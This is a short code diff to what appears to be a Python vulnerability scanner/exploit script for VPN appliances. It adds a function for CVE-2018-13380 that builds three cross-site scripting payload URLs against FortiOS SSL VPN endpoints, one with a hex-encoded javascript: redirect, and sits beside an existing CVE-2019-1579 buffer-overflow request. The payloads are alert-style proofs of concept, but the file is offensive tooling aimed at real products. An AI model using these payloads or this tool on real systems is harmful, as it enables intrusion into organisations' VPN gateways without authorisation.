@@ -116,6 +116,17 @@ def cve_2019_1579(host, port):
         data = "scep-profile-name=%s" % buff
         r = requests.post(url, data=data, verify=False).text.replace('\n', '')
         print(r + crlf)
+        
+        
+def cve_2018_13380(host, port):
+    url1 = 'https://%s%s/remote/error?errmsg=ABABAB--\%3E\%3Cscript\%3Ealert(1)\%3C/script\%3E' % (host, port)
+    url2 = 'https://%s%s/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29' % (host, port)
+    url3 = 'https://%s%s/message?title=x&msg=%26%23<svg/onload=alert(1)>;' % (host, port)
+    
+    print('Got XSS payloads for %s: ' % host)
+    print(' - %s' % red + url1)
+    print(' - %s' % red + url2)
+    print(' - %s' % red + url3)
 
 
 def scan(host):
